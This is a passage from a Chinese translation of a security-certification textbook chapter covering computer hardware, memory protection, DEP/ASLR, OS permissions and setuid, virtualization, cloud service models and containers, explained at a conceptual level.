  \ 虚拟化技术，又称“Vanderpool”）和 `AMD-V`（AMD 虚拟化，又称“Pacifica”）CPU 支持管理程序。\n\n#### 开放与封闭系统\n\
  \n*开放系统*使用开放的硬件和标准，采用来自多个供应商的标准组件。IBM 兼容 PC 是开放系统，使用标准主板、内存、BIOS、CPU 等。您可以通过从多家供应商采购组件来构建一台\
  \ IBM 兼容 PC。*封闭系统*使用专有硬件或软件。\n\n> **注意**\n>\n> “开放系统”不等同于“开源”。开放系统使用标准硬件和软件。开源软件公开提供源代码。\n\
  \n### 安全硬件架构\n\n安全硬件架构关注实现安全系统所需的物理计算机硬件。硬件必须为进程、数据和用户提供机密性、完整性和可用性。\n\n#### 机箱与主板\n\
  \n*机箱*是计算机的外壳：它包含所有内部电子计算机组件，包括主板、内部磁盘驱动器和电源。*主板*包含 CPU、内存插槽、固件以及外设插槽（如 `PCI`（外设组件互连）插槽）等硬件。键盘单元是外部键盘。\n\
  \n#### 计算机总线\n\n*计算机总线*（如图 4.8 所示）是计算机系统上的主要通信通道。CPU、内存以及键盘、鼠标、显示器等输入/输出设备之间的通信通过总线进行。\n\
  \n![图 4.8 简化的计算机总线。](img/f04-08-9780443187346.jpg)\n\n图 4.8 简化的计算机总线。\n\n##### 北桥与南桥\n\
  \n某些计算机设计使用两条总线：一个*北桥*和一个*南桥*。名称源于视觉设计，通常北桥显示在顶部，南桥显示在底部，如图 4.9 所示。北桥，也称为内存控制器中心（`MCH`），将\
  \ CPU 连接到*内存*和显存。南桥，也称为 I/O 控制器中心（`ICH`），连接输入/输出（I/O）设备，如磁盘、键盘、鼠标、光驱和 USB 端口。北桥直接连接到\
  \ CPU，速度比南桥快。\n\n![图 4.9 北桥和南桥设计。](img/f04-09-9780443187346.jpg)\n\n图 4.9 北桥和南桥设计。\n\
  \n#### CPU\n\n中央处理单元（CPU）是计算机的“大脑”，能够控制并执行数学计算。归根结底，计算机所做的一切都是数学运算：加法（可扩展为减法、乘法、除法等）、执行逻辑运算、按地址访问内存位置等。CPU\
  \ 以每秒时钟周期数来衡量性能。一款 2.4 GHz 的奔腾 4 CPU 每秒拥有 24 亿个时钟周期。\n\n##### 算术逻辑单元与控制单元\n\n*算术逻辑单元*（ALU）执行数学计算：它进行“运算”。它由*控制单元*提供指令，控制单元充当“指挥官”，将指令发送给\
  \ ALU。\n\n##### 取指与执行\n\nCPU 取出机器语言指令（如“1 + 1”）并执行它们（相加得出“2”）。*“取指与执行”*（也称为“取指、译码、执行”，或\
  \ `FDX`）过程实际上包含四个步骤：\n\n1.  取指令 1\n2.  译码指令 1\n3.  执行指令 1\n4.  写回（保存）结果 1\n\n这四个步骤在一个时钟周期内完成。\n\
  \n##### 流水线\n\n*流水线*将多个步骤合并为一个组合过程，允许对不同指令同时进行取指、译码、执行和写回步骤。每个部分称为一个流水线阶段；流水线深度是可同时完成的阶段数量。\n\
  \n以我们之前“1 + 1”的取指执行示例为例，没有流水线的 CPU 必须等待一个完整周期才能执行下一次计算。四阶段流水线可以组合其他四条指令的阶段：\n\n\
  1.  取指令 1\n2.  取指令 2，译码指令 1\n3.  取指令 3，译码指令 2，执行指令 1\n4.  取指令 4，译码指令 3，执行指令 2，写回（保存）结果\
  \ 1\n5.  取指令 5，译码指令 4，执行指令 3，写回（保存）结果 2，以此类推。\n\n流水线类似于汽车装配线：不是一次从头到尾制造一辆车，而是许多汽车进入装配流水线，离散阶段（如安装轮胎）依次在一辆接一辆的车上进行。这提高了吞吐量。\n\
  \n##### 中断\n\n*中断*表示发生了异步事件。CPU 中断是一种硬件中断，导致 CPU 停止处理当前任务，保存状态，并开始处理新请求。新任务完成后，CPU\
  \ 将继续处理先前的任务。\n\n##### 进程与线程\n\n*进程*是加载并在内存中运行的可执行程序及其相关数据。“重量级进程”（HWP）也称为任务。父进程可能衍生出称为*线程*的额外子进程。线程是轻量级进程（LWP）。线程可共享内存，与重量级进程相比开销更低。\n\
  \n进程可能处于多种状态：\n\n*   新建：正在创建的进程\n*   就绪：等待 CPU 执行的进程\n*   运行：正在由 CPU 执行的进程\n*  \
  \ 阻塞：等待 I/O\n*   终止：已完成的进程\n\n另一种进程类型是“僵尸进程”，即父进程已终止的子进程。\n\n##### 多任务与多处理\n\n应用程序作为进程在内存中运行，由可执行代码和数据组成。*多任务*允许多个任务（重量级进程）在一个\
  \ CPU 上同时运行。较旧且较简单的操作系统（如 `MS-DOS`）是非多任务的：它们一次运行一个进程。大多数现代操作系统（如 Linux、Windows 10\
  \ 和 OS X）支持多任务。\n\n> **注意**\n>\n> 有些资料提及与多任务相关的其他术语，包括多道程序设计和多线程。多道程序设计是多个程序在一个\
  \ CPU 上同时运行；多任务是多个任务（进程）在一个 CPU 上同时运行；多线程是多个线程（轻量级进程）在一个 CPU 上同时运行。\n\n\n\n\n\n\
  #### 多道程序设计和多任务处理\n\n多道程序设计是多任务处理的一种较早形式；许多资料将这两个术语同义使用。本书将使用“多任务处理”一词来指代在一个 CPU\
  \ 上运行的多个同时进行的进程。\n\n**多处理**与多任务处理有根本区别：它在多个 CPU 上运行多个进程。多处理的两种类型是**对称多处理**和**非对称多处理（AMP，某些资料使用\
  \ ASMP）**。SMP 系统使用一个操作系统来管理所有 CPU。AMP 系统每个 CPU 拥有一个操作系统映像，本质上表现为独立的系统。\n\n#### 看门狗定时器\n\
  \n**看门狗定时器**旨在当关键进程挂起或崩溃时，通过重启来恢复系统。当看门狗定时器归零时，它会重启系统；关键操作系统进程会持续重置该定时器，因此只要它们在运行，定时器永远不会归零。如果关键进程挂起或崩溃，它们将不再重置看门狗定时器，定时器随之归零，系统随即重启。\n\
  \n#### CISC 和 RISC\n\n**CISC**（Complex Instruction Set Computer，复杂指令集计算机）和 **RISC**（Reduced\
  \ Instruction Set Computer，精简指令集计算机）是两种 CPU 设计形式。CISC 使用大量复杂的机器语言指令，而 RISC 使用精简的、更简单的指令集。\n\
  \n关于“最佳” CPU 设计方式一直有争议：底层命令应该更长、更强大，用更少的单个指令执行复杂任务（CISC），还是命令应该更短、更简单，执行复杂任务需要更多单个指令（RISC），但允许每条指令更少的周期和更高效的代码？没有“正确”的答案：两种方法各有优缺点。×86\
  \ CPU（以及许多其他）属于 CISC；ARM（用于许多手机和 PDA）、PowerPC、Sparc 等属于 RISC。\n\n#### 内存寻址\n\n值可存储在内存的多个位置，包括\
  \ CPU 寄存器和通用 RAM。这些值可被直接寻址（“加上存储在这里的值”）或间接寻址（“加上此处引用的内存位置存储的值”）。间接寻址类似于指针。寻址模式取决于\
  \ CPU；常见支持的模式包括直接、间接、寄存器直接和寄存器间接。\n\n直接模式表示“将 X 加到存储在内存位置 #YYYY 的值上。”该位置存储数字 7，因此\
  \ CPU 执行 X + 7。间接模式起始方式相同：“将 X 加到存储在内存位置 #YYYY 的值上。”区别在于 #YYYY 存储的是另一个内存位置（#ZZZZ）。CPU\
  \ 顺着指针找到 #ZZZZ，其中存有值 7，并执行 X + 7。\n\n寄存器直接寻址与直接寻址相同，只是它引用 CPU 高速缓存寄存器，如寄存器 1。寄存器间接寻址也与间接寻址相同，只是指针存储在寄存器中。图\
  \ 4.10 总结了这四种寻址模式。\n\n![图 4.10 内存寻址总结。](img/f04-10-9780443187346.jpg)\n\n图 4.10\
  \ 内存寻址总结。\n\n#### 内存保护\n\n内存保护防止一个进程影响另一个进程的机密性、完整性或可用性。这是安全多用户（多个用户同时登录）和多任务（多个进程同时运行）系统的要求。\n\
  \n##### 进程隔离\n\n**进程隔离**是一种逻辑控制，旨在防止一个进程干扰另一个进程。这是 Linux、UNIX 或较新的 Microsoft Windows\
  \ 操作系统等多用户操作系统的常见特性。较旧的操作系统（如 MS-DOS）不提供进程隔离。缺乏进程隔离意味着任何 MS-DOS 应用程序的崩溃都可能导致整个系统崩溃。\n\
  \n如果您在网上购物并输入信用卡号购买书籍，该号码将以明文形式存在于内存中（至少持续一小段时间）。进程隔离意味着同一台计算机上的另一个进程无法干扰您的进程。\n\
  \n干扰包括对机密性的攻击（读取您的信用卡号）、完整性的攻击（修改您的信用卡号）和可用性的攻击（干扰或阻止购买书籍）。\n\n用于提供进程隔离的技术包括虚拟内存（下一节讨论）、**对象封装**和**时间复用**。对象封装将进程视为“黑盒”，我们将在第\
  \ 9 章（领域 8：软件开发安全）中讨论。时间复用在多个进程之间共享（复用）系统资源，每个进程拥有专用的时间片。\n\n##### 硬件分段\n\n硬件分段通过将进程映射到特定内存位置，将进程隔离向前推进了一步。这比（逻辑）进程隔离单独提供更高的安全性。\n\
  \n##### 虚拟内存\n\n**虚拟内存**在应用程序和硬件内存之间提供虚拟地址映射。虚拟内存提供多种功能，包括多任务处理（多个任务在一个 CPU 上同时执行）、允许多个进程访问内存中的同一共享库、交换等。\n\
  \n> **考试警告**\n>\n> 虚拟内存允许交换，但虚拟内存还有其他功能。换句话说，虚拟内存不等于交换。\n\n###### 交换和分页\n\n**交换**利用虚拟内存将主内存（RAM）中的内容复制到辅助内存（CPU\
  \ 不可直接寻址，位于磁盘上），或从辅助内存复制回主内存。交换空间通常是一个专用磁盘分区，用于扩展可用内存量。如果内核尝试访问存储在交换空间中的页面（固定长度的内存块），会发生缺页中断（表示该页面不在\
  \ RAM 中的错误），随即将该页面从磁盘“换入”到 RAM。\n\n> **注意**\n>\n> “交换”和“分页”常互换使用，但两者略有区别：分页将内存块复制到磁盘或从磁盘复制，而交换将整个进程复制到磁盘或从磁盘复制。本书使用术语“交换”。\n\
  \n图 4.11 显示了 Linux 命令 `top` 的输出，该命令显示排名靠前进程的内存信息，以及可用剩余内存的摘要。它显示的系统拥有 1,026,560\
  \ kb RAM 和 915,664 kb 虚拟内存（交换）。系统总内存为 1,942,224 kb，但仅有一半多一点可直接访问。\n\n![图 4.11 Linux“top”输出。](img/f04-11-9780443187346.jpg)\n\
  \n图 4.11 Linux“top”输出。\n\n大多数配置了虚拟内存的计算机（如图 4.11 所示系统）将仅使用 RAM，直到 RAM 接近或完全填满。随后系统会将进程交换到虚拟内存。它会尝试寻找空闲进程，以使交换的影响最小化。\n\
  \n最终，随着更多进程启动且内存持续填满，RAM 和交换空间都将填满。在系统耗尽可交换的空闲进程后，可能被迫交换活动进程。系统可能开始“颠簸”，花费大量时间在交换空间间复制数据，严重影响可用性。\n\
  \n交换设计为一种保护措施，用于处理偶发的内存使用高峰。系统不应常规性地使用大量交换空间：若出现这种情况，应增加物理内存，或移除、迁移、缩减进程。\n\n####\
  \ BIOS\n\n\n\n\n\n##### IBM PC 兼容基本输入输出系统\n\nIBM PC 兼容基本输入输出系统包含固件中的代码，这些代码在 PC\
  \ 上电时执行。它首先运行*加电自检*（POST），执行基本测试，包括验证 BIOS 本身的完整性、测试内存、识别系统设备等任务。一旦 POST 过程成功完成，它会定位引导扇区（对于从磁盘启动的系统），其中包含操作系统内核的机器代码。随后内核加载并执行，操作系统启动。\n\
  \n#### WORM 存储\n\n**WORM**（一次写入，多次读取）存储只能写入一次，但可读取多次。它常用于支持法律或法规合规性要求的记录保留。WORM\
  \ 存储有助于确保其所含数据的完整性：除非销毁介质本身，否则可以确信数据未被（也无法被）篡改。\n\n最常见的 WORM 介质类型是 CD-R（可刻录光盘）和\
  \ DVD-R（可刻录数字多功能光盘）。请注意，CD-RW 和 DVD-RW（可重写）不属于 WORM 介质。某些数字线性磁带（DLT）驱动器和介质支持 WORM\
  \ 功能。\n\n#### 可信平台模块\n\n由可信计算组开发和更新的可信平台模块（TPM）芯片是一种处理器，可在硬件级别提供额外的安全功能。并非所有计算机制造商都采用\
  \ TPM 芯片，但其采用率稳步上升。如果包含 TPM 芯片，通常位于系统的主板上。\n\nTPM 芯片支持基于硬件的加密操作。安全功能可利用 TPM 进行随机数生成、使用对称、非对称和哈希算法，以及安全存储加密密钥和消息摘要。TPM\
  \ 芯片最常见的用例是确保启动完整性。通过在硬件级别运行，TPM 芯片有助于确保内核模式 Rootkit 更难以破坏操作系统安全。除了启动完整性，TPM 还通常与某些全盘加密实现相关联。在加密场景下，TPM\
  \ 可用于安全存储解密硬盘所需的密钥。\n\n鉴于存储了高度敏感和宝贵的信息，TPM 芯片本身可能成为攻击者的目标。由于 TPM 基于硬件，从操作系统远程篡改\
  \ TPM 的可能性大大降低。TPM 芯片还具有防篡改特性，旨在确保物理上受损的 TPM 芯片不会导致其提供的安全功能被轻易绕过。\n\n#### 数据执行保护和地址空间布局随机化\n\
  \n试图利用软件漏洞时的主要目标之一是实现某种形式的代码执行能力。概念上，攻击者希望提供自己选择的指令或提供的代码，由受损应用程序执行。例如，通过基于栈或堆的缓冲区溢出条件故意破坏系统内存，是攻击者常用的手段。\n\
  \n针对这类内存破坏或溢出攻击，最显著的两种保护机制是 DEP（数据执行保护）和 ASLR（地址空间布局随机化）。DEP 可在硬件和/或软件中启用，旨在确保未预定义包含可执行内容的内存位置无法执行代码。例如，攻击者利用允许攻击者提供的\
  \ Shellcode 最终位于内存中通用数据存储位置的缓冲区溢出漏洞。若启用了 DEP，且该位置未被标记为预期包含可执行内容，则成功利用可能被缓解。\n\n\
  另一种保护机制 ASLR 旨在通过使系统使用的内存地址更难预测，从而降低成功利用的可能性。在开发漏洞利用代码和构建后利用能力时，利用代码会利用运行中系统上已加载的现有代码。如果这些组件始终位于相同的内存地址，则利用难度会降低。通过随机化内存地址，攻击者面临更难利用的目标。作为\
  \ ASLR 成功的一个例子，设想攻击者在自己的测试机器上开发出一个成功的可用漏洞利用代码。当该代码（依赖特定操作系统库和代码位于可预测的内存地址）移植到启用了\
  \ ASLR 的机器上时，漏洞利用可能会失败。\n\n这些保护机制的目标常被认为是防止利用。然而，这一目标虽值得赞赏，但永远无法始终如一地实现。更准确地说，这些缓解技术的目标应被视为试图增加攻击者开发漏洞利用代码的成本。\n\
  \n### 安全操作系统和软件架构\n\n安全操作系统和软件架构建立在上一节所述的安全硬件之上，在硬件与访问硬件的应用程序（及用户）之间提供安全接口。操作系统提供内存、资源和进程管理。\n\
  \n#### 内核\n\n内核是操作系统的核心，通常运行在 Ring 0。它提供硬件与操作系统其余部分（包括应用程序）之间的接口。如前所述，当 IBM 兼容 PC\
  \ 启动或重启时，BIOS 会定位存储设备（如硬盘）的引导扇区。该引导扇区包含软件内核机器代码的开头部分，随后被执行。内核有两种基本设计：*单内核*和*微内核*。\n\
  \n单内核被编译成一个静态可执行文件，整个内核运行在管理员模式下。单内核所需的所有功能必须预先编译进去。例如，如果你有一个不支持 FireWire 接口的单内核，并向系统插入\
  \ FireWire 设备，该设备将无法工作。内核需要重新编译以支持 FireWire 设备。\n\n微内核是模块化内核。微内核通常较小，原生功能比典型单内核少（因此称为“微”），但可通过可加载内核模块添加功能。微内核也可能在用户模式（通常为\
  \ Ring 3）而非管理员模式下运行内核模块。沿用前例，原生微内核不支持 FireWire。插入 FireWire 设备后，内核加载 FireWire 内核模块，设备即可工作。\n\
  \n##### 参考监视器\n\n内核的核心功能是运行*参考监视器*，它调解主体与客体之间的所有访问。它强制执行系统的安全策略，例如阻止普通用户写入受限文件（如系统密码文件）。在强制访问控制（MAC）系统中，参考监视器阻止机密主体读取绝密客体。参考监视器始终启用且无法绕过。安全系统可对参考监视器的安全性进行评估。\n\
  \n#### 用户和文件权限\n\n文件权限（如读、写、执行）控制对文件的访问。可用的权限类型取决于所使用的文件系统。\n\n##### Linux 和 UNIX\
  \ 权限\n\n大多数 Linux 和 UNIX 文件系统支持以下文件权限：\n\n- **读取**（“r”）\n- **写入**（“w”）\n- **执行**（“x”）\n\
  \n这些权限中的每一项均可分别针对所有者、组或其他用户进行设置。图 4.12 显示了 Linux `ls -la /etc`（列出 `/etc` 目录下所有文件，长格式输出）命令的输出。\n\
  \n\n\n\n\n![Fig. 4.12 Linux “ls -la” command.](img/f04-12-9780443187346.jpg)\n\n\
  图 4.12 Linux “ls -la” 命令。\n\n图 4.12 中的输出显示了权限、所有者、组、大小、日期和文件名。以“d”开头的权限（如“acpi”）表示目录。以“-”开头的权限（如“at.deny”）表示文件。图\
  \ 4.13 放大显示了 `/etc` 中的文件，重点突出了所有者、组和其他用户的权限。\n\n![Fig. 4.13 Linux /etc permissions,\
  \ highlighting owner, group, and world.](img/f04-13-9780443187346.jpg)\n\n图 4.13\
  \ Linux /etc 权限，重点突出所有者、组和其他用户。\n\n图 4.13 中的 `adduser.conf` 文件由 root 所有，权限为“-rw-r--r--”。这意味着\
  \ `adduser.conf` 是一个文件（权限以“-”开头），所有者（root）拥有读和写（rw-）权限，组（也是 root）拥有读（r--）权限，其他用户拥有读（r--）权限。\n\
  \n##### Microsoft NTFS 权限\n\nMicrosoft NTFS（新技术文件系统）具有以下基本文件权限：\n\n*   读取\n*   写入\n\
  *   读取和执行\n*   修改\n*   完全控制（读取、写入、执行、修改，此外还包括更改权限的能力）\n\nNTFS 的权限类型比大多数 UNIX 或 Linux\
  \ 文件系统更多。NTFS 文件由所有者控制，所有者可向其他用户授予权限。图 4.14 显示了位于 `C:\\Users\\Public\\Pictures\\\
  Sample Pictures\\Penguins.jpg` 的示例照片的权限。\n\n![Fig. 4.14 NTFS permissions.](img/f04-14-9780443187346.jpg)\n\
  \n图 4.14 NTFS 权限。\n\n要查看这些权限，请右键单击 NTFS 文件，选择“属性”，然后选择“安全”。\n\n##### 特权程序\n\n在 UNIX\
  \ 和 Linux 系统中，普通用户无法编辑密码文件（`/etc/passwd`）和影子文件（`/etc/shadow`），它们分别存储账户信息和加密密码。但用户需要能够更改他们的密码（从而更改这些文件）。如果他们不能（直接）更改这些文件，如何更改密码呢？\n\
  \n答案是 `setuid`（设置用户 ID）程序。`Setuid` 是一种 Linux 和 UNIX 文件权限，它使可执行文件以文件所有者的权限运行，而不是以运行用户的权限运行。`Setgid`（设置组\
  \ ID）程序以文件所属组的权限运行。\n\n图 4.15 显示了用于设置和更改密码的 Linux 命令 `/usr/bin/passwd` 的权限。它是 `setuid`\
  \ root（该文件由 root 用户所有，且所有者的执行位设置为“s”，表示 `setuid`），这意味着它以 root（超级用户）权限运行，无论运行用户是谁。\n\
  \n![Fig. 4.15 Linux setuid root program /usr/bin/passwd.](img/f04-15-9780443187346.jpg)\n\
  \n图 4.15 Linux `setuid` root 程序 `/usr/bin/passwd`。\n\n“passwd”程序以 root 身份运行，允许任何用户更改其密码，从而更改\
  \ `/etc/passwd` 和 `/etc/shadow` 的内容。`Setuid` 程序必须经过严格审查以发现安全漏洞：攻击者可能会试图欺骗 `passwd`\
  \ 命令以修改其他文件。应密切监控系统上所有 `setuid` 和 `setgid` 程序的完整性。\n\n#### 虚拟化、云计算和分布式计算\n\n虚拟化和分布式计算彻底改变了计算世界，给应用程序、服务、系统数据和数据中心带来了彻底的变革。昨天的最佳实践可能不再适用。当数据在云端时，DMZ\
  \ 在哪里？你的 NIDS 能否监控单个主机上从一个客户机发送到另一个客户机的数据？你的物理防火墙还重要吗？\n\n##### 虚拟化\n\n*虚拟化*在操作系统和底层计算机硬件之间增加了一个软件层。这允许多个“客户机”操作系统在一台物理“主机”计算机上同时运行。流行的透明虚拟化产品包括\
  \ VMware、QEMU 和 Xen。\n\n虚拟化有两种基本类型：透明虚拟化（有时称为完全虚拟化）和半虚拟化。透明虚拟化将标准操作系统（如 Windows\
  \ 11 或 Ubuntu Linux 22.04）作为虚拟客户机运行。无需更改客户机操作系统。半虚拟化运行专门修改过的操作系统，具有修改过的内核系统调用。半虚拟化可能更高效，但需要更改客户机操作系统。对于闭源操作系统（如\
  \ Microsoft Windows 系列）来说，这可能是不可能的。\n\n###### 管理程序\n\n虚拟化安全的关键在于*管理程序*，它控制虚拟客户机与主机硬件之间的访问。类型\
  \ 1 管理程序（也称为裸金属）是直接运行在主机硬件上的操作系统的一部分。类型 2 管理程序作为普通操作系统（如 Windows 10）上的应用程序运行。例如：VMware\
  \ ESX 是类型 1 管理程序，VMware Workstation 是类型 2。\n\n许多虚拟化漏洞利用针对管理程序，包括主机与客户机之间、客户机与客户机之间共享的由管理程序控制的资源。这些包括剪切粘贴、共享驱动器和共享网络连接。\n\
  \n###### 虚拟化优势\n\n虚拟化提供了许多优势，包括降低整体硬件成本、硬件整合，以及降低电力和冷却需求。快照允许管理员创建操作系统镜像，只需点击鼠标即可恢复，使备份和恢复变得简单快捷。测试新操作系统、应用程序和补丁可以非常简单。虚拟客户机集群比直接运行在硬件上的操作系统集群要简单得多。\n\
  \n###### 虚拟化安全问题\n\n虚拟化软件复杂且相对较新。如前所述，复杂性是安全的敌人：虚拟化软件的极高复杂性可能导致安全问题。\n\n将多个客户机合并到一台主机上也可能引发安全问题。虚拟化不能替代防火墙：切勿将具有不同安全需求的客户机（如\
  \ DMZ 和内部）合并到一台主机上。虚拟化逃逸（称为 VMEscape，攻击者从一个客户机利用主机操作系统或另一个客户机）的风险是近期研究的热门话题。Network\
  \ World 报道：“在 Cisco 的企业 NFV 基础设施软件 (NFVIS) 中发现了多个漏洞。最严重的漏洞可能允许攻击者从客户机虚拟机 (VM) 逃逸到主机，Cisco\
  \ 披露。另外两个问题涉及允许恶意行为者注入在根级别执行的命令，以及允许远程攻击者将主机的系统数据泄露给 VM” [\\[15\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0080)。已知的虚拟化逃逸漏洞已修补，但新问题可能会出现。\n\
  \n许多基于网络的安全工具（如网络入侵检测系统）可能因虚拟化而“失明”。连接到物理 SPAN 端口或分流器的传统 NIDS 无法看到同一主机上从一个客户机传递到另一个客户机的流量。NIDS\
  \ 厂商开始提供虚拟 IDS 产品，这些产品作为软件运行在主机上，能够检查主机-客户机和客户机-客户机流量。防火墙也正在发生类似的从物理到虚拟的转变。\n\n\
  ##### 云计算\n\n\n\n\n\n###### 公有云计算\n\n公有云计算将 IT 基础设施、存储或应用程序外包给第三方提供商。云也意味着计算资源的地理多样性。云计算的目标是让大型提供商利用其规模经济，向其他公司提供计算资源，这些公司通常根据使用量为这些服务付费。\n\
  \n###### 云服务层级\n\n云提供商提供的三种常见服务层级是**基础设施即服务**，**平台即服务**，和**软件即服务**。\n\n*   **基础设施即服务**提供完整的虚拟化操作系统，由客户从操作系统层面开始进行配置。\n\
  *   **平台即服务**提供预配置的操作系统，由客户配置应用程序。\n*   **软件即服务**从操作系统到应用程序均已完全配置，客户只需使用该应用程序即可。\n\
  \n在以上三种情况下，云提供商均负责管理硬件、虚拟化软件、网络、备份等。各类型的典型示例请参见表 4.2。\n\n####### 表 4.2 云服务层级示例\n\
  \n| 类型 | 示例 |\n| :--- | :--- |\n| 基础设施即服务 | Linux 服务器托管 |\n| 平台即服务 | Web 服务托管 |\n\
  | 软件即服务 | Web 邮件 |\n\n###### 云部署模型\n\n**私有云**存放单个组织的数据，可由第三方运营，也可由组织自行运营。**政府云**旨在将数据和资源在地理上限制在一个国家的边界内，专为相应国家的政府设计。\n\
  \n###### 优势与安全考量\n\n云计算的优势包括降低前期资本支出、降低维护成本、提供稳健的服务级别以及总体运营成本节约。\n\n从安全角度来看，利用公有云计算服务需要严格的服务级别协议，并了解新的风险来源。一个担忧是多个组织的客户机运行在同一宿主机上。一家云客户的遭受攻破可能导致其他客户也被攻破。\n\
  \n此外，许多云提供商提供预配置的系统镜像，这可能因不安全的配置而引入风险。例如，设想一个包含操作系统、Web 服务和博客软件且均已预配置的博客服务镜像。与预配置镜像相关的任何漏洞都可能给使用该镜像的每个组织带来风险。\n\
  \n####### 实例学习：预置镜像\n\n2011 年，亚马逊向部分 **EC2 (Elastic Cloud Compute，弹性云计算)** 客户发送邮件，警告称：“我们最近注意到，美国东部区域的一个公共\
  \ **AMI** 附带分发了一个 SSH 公钥，这将允许发布者以 root 身份登录” [[16]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0085)。\n\
  \n**AMI** 代表 **Amazon Machine Image（亚马逊机器镜像）**，即预配置的虚拟客户机。TippingPoint 的 DVLabs\
  \ 描述了发生的情况：“受感染的镜像由 Ubuntu 10.4 服务器组成，运行着 Apache、MySQL 和 PHP……该镜像似乎是在……6 个月前发布的，而我们直到现在才听说这个问题。究竟发生了什么？一位名为\
  \ guru 的 EC2 用户创建了这个镜像，其中包含他最常用的软件栈，然后将其发布到 Amazon AMI 社区。如果不是一个简单的事实，这一切本来都很好。该镜像在发布时仍然保留着他的\
  \ SSH 密钥。这意味着镜像发布者（本案中为 guru）可以作为 root 用户登录任何运行其镜像的服务器实例。密钥被遗留在 `/root/.ssh/authorized_keys`\
  \ 和 `/home/ubuntu/.ssh/authorized_keys` 中。我们将生成的镜像称为‘官方翻新’。发布者声称这纯属意外，只是其缺乏经验的结果。无论这说法是否属实，该事件暴露了\
  \ EC2 社区内的一个重大安全漏洞” [[16]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0085)。\n\
  \n组织必须分析与预配置云系统相关的风险，并考虑从“基础”开始配置系统的选项，即从基础操作系统着手。\n\n组织在与云计算提供商签订合同前，还应协商具体权利。这些权利包括审计权、漏洞评估权，以及对放置在云中的数据和系统进行渗透测试（包括电子和物理测试）的权利。\n\
  \n最后，你知道你的数据在哪里吗？公有云可能会将数据移动到任何国家，可能超出组织所在国的司法管辖范围。例如，基于美国的法律，如**《健康保险流通与责任法案》**或**《格雷姆-里奇-比利雷金融服务现代化法案》**，在美国境外不生效。在这些情况下，应考虑使用私有云或政府云。\n\
  \n###### 共享责任\n\n在云计算出现之前的世界里，责任划分更简单。正如我们稍后将讨论的，**分界点**描述了客户（其路由器及其后方的所有设备）和 ISP（ISP\
  \ 的路由器及其后方的所有设备）各自的责任。共享责任实际上就是连接这两个路由器的一根电缆。“责任”描述了谁负责配置、维护和保护分界点两侧的系统。它也反映了对可用性（正常运行时间）和法律责任的双重承担。\n\
  \n由于其本质，责任在云中更为复杂。图 4.16 来自美国总务管理局 (GSA)，是一张很棒的图表 [[17]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0090)，描述了从本地部署（标记为企业\
  \ IT，客户承担 100% 责任）到 IaaS、PaaS 和 SaaS（云提供商承担最大责任）的责任范围。\n\n![图 4.16 共享责任。](img/f04-16-9780443187346.jpg)\n\
  \n图 4.16 共享责任。\n\n##### 微服务、容器和无服务器\n\n云计算革命持续发展并演化出新技术，包括微服务、云和无服务器。这些技术的目标之一是降低计算成本。最初我们有运行在裸机硬件上的计算机。随后虚拟化技术允许多个操作系统在一个管理程序上运行。云为虚拟化带来了规模。每一步都降低了成本。这一过程随着微服务、容器和无服务器的出现而继续，我们接下来将进行讨论。\n\
  \n###### 微服务\n\n想象一家 20 年前在线销售玩具的公司。一年中的大部分时间使用量（相对）较低，但在促销和圣诞节期间会激增。该公司日常运营需要 100\
  \ 台服务器。在高峰期（圣诞购物季），使用量会激增，公司需要 1000 台服务器来满足需求。\n\n直接构建在硬件上（虚拟化之前）将非常昂贵：900 台服务器将在大半年内闲置。虚拟化改善了情况，但公司仍需要一个能运行\
  \ 1000 台虚拟机的管理程序。云提供了真正的突破；玩具公司可以利用 **Amazon AWS**、**Microsoft Azure**、**Google\
  \ Compute**（以及许多其他云提供商）按需配置虚拟系统，并在高峰期过后将其关闭。\n\n\n\n\n\n###### 微服务\n\n微服务在降低成本的同时，提供了额外的扩展机会。服务器在历史上是单体式的：一台服务器提供一系列服务。以上面的玩具公司为例，每台服务器可能提供一系列服务：身份验证、库存、搜索、购物车、信用卡验证、配送等。微服务通过\
  \ API（应用程序编程接口）将这些服务拆分出来，并使用容器和无服务器等技术来提供所需功能。Amazon 对微服务的描述如下：\n\n> 采用单体架构时，所有进程都紧密耦合并作为单个服务运行。这意味着，如果应用程序的某个进程遇到需求激增，则必须扩展整个架构。随着代码库的增长，添加或改进单体应用程序的功能变得更加复杂。这种复杂性限制了实验，并使实施新想法变得困难。单体架构增加了应用程序可用性的风险，因为许多依赖且紧密耦合的进程增加了单个进程故障的影响。\n\
  \n> 采用微服务架构时，应用程序作为独立组件构建，每个应用程序进程作为一个服务运行。这些服务通过定义良好的接口使用轻量级 API 进行通信。服务是为业务能力而构建的，每个服务执行单一功能。因为它们是独立运行的，所以每个服务都可以更新、部署和扩展，以满足应用程序特定功能的需求\
  \ [\\[18\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0095)。\n\n###### 容器\n\
  \n容器是一项（相对）较老但持续改进的技术。它们源自 BSD 的“chroot”（更改根目录）功能，该功能将进程锁定在一个目录中。该进程（如 Bind 域名服务器守护进程）只能访问其目录中的文件，而无法访问目录外部的文件。例如：如果\
  \ Bind 被 chroot 到 `/var/bind`，它就无法读取该目录及其子目录（如 `/var/bind/conf`）之外的任何内容。这样做是为了将受损服务对操作系统其余部分的风险降至最低：例如，无法访问\
  \ `/etc/passwd` 和 `/etc/shadow` 等文件。\n\nBSD jails（BSD 监狱）建立在 chroot 概念之上，同时也隔离了网络：例如，每个\
  \ jail 都有自己的 IP 地址。同一系统上需要传输数据的两个 jail 需要通过网络进行通信。\n\nBSD 操作系统称此概念为 jail，而 Linux\
  \ 使用术语 container（容器）。Docker 是最流行的容器技术之一，专注于大规模编排。Docker 对容器的描述如下：\n\n> 容器是一种标准的软件单元，它将代码及其所有依赖项打包在一起，以便应用程序能够从一个计算环境快速可靠地运行到另一个计算环境。Docker\
  \ 容器镜像是一种轻量级、独立、可执行的软件包，包含运行应用程序所需的一切：代码、运行时、系统工具、系统库和设置 [\\[19\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0100)。\n\
  \n####### 容器与虚拟化\n\n您可能会想：容器与虚拟化有何不同？关键区别在于：每个虚拟系统运行自己的内核。运行三台虚拟机的管理程序意味着有四个内核在运行：一个用于管理程序，每个\
  \ VM 一个。运行三个容器的宿主系统意味着只有一个内核在运行：宿主系统的内核。每个容器也使用宿主系统的内核。这意味着容器比 VM 需要更少的资源，但也意味着它们（从安全角度来看）不如\
